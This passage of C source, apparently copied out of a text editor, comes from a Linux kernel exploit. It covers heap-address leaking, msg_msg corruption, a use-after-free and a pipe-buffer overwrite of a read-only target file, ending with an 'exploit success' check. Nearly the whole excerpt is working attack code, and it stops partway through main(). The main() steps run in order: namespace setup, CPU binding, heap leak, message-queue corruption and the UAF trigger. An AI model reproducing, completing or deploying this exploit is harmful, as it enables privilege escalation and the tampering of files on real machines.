    spray_skbuff_data(bak_pipe_buffer, 0x400 - SIZE_OF_SKB_SHARED_INFO);

    logd("try to overwrite %s", ATTACK_FILE);
    {
        ssize_t nbytes = write(pipes[uaf_pipe_idx][1], attack_data, sizeof(attack_data));
        if (nbytes < 0) {
            perror("write failed");
            die();
        }
        if ((size_t)nbytes < sizeof(attack_data)) {
            fprintf(stderr, "short write\n");
            die();
        }
    }

    logd("see if %s changed", ATTACK_FILE);
    {
        int fd = open(ATTACK_FILE, O_RDONLY);
        if (fd < 0) {
            die("open attack file");
        }
        char tmp_buffer[0x10];
        read(fd, tmp_buffer, 0x10);
        uint32_t *ptr = (uint32_t *)(tmp_buffer + 9);
        if (ptr[0] != 0x56565656) {
            hexdump(tmp_buffer, 0x10);
            die("overwrite attack file failed: 0x%08x", ptr[0]);
        }
    }
    logi("exploit success");
    return 0;
}

int main(int argc, char **argv) {
    pipe(sync_pipe);


    if (!fork()) {
        logi("STEP 0: do init");
        logd("init unshare ...");
        init_unshare();
        logd("bind cpu ...");
        bind_cpu();
        logd("init msq ...");
        init_msq();
        logd("init sock ...");
        init_sock();

        logi("STEP 1: leak heap address");
        uint64_t dev_addr = 0;
        while (!dev_addr) {
            dev_addr = leak_dev_addr();
            usleep(10);
        }

        logi("STEP 2: do uaf");
        int corrupted_sec_msqid1 = -1;
        int corrupted_sec_msqid2 = -1;
        while (corrupted_sec_msqid1 < 0) {
            corrupted_sec_msqid1 = do_msg_corruption();
            usleep(10);
        }
        while (corrupted_sec_msqid2 < 0) {
            corrupted_sec_msqid2 = do_msg_corruption();
            usleep(10);
        }
        do_uaf(corrupted_sec_msqid1, corrupted_sec_msqid2);

        write(sync_pipe[1], "T", 1);

        while (1) {
            sleep(10);
        }
    } else {
        char sync;
        read(sync_pipe[0], &sync, 1);
                                                                                                                                                                                                                                                                                                            771,10        99%
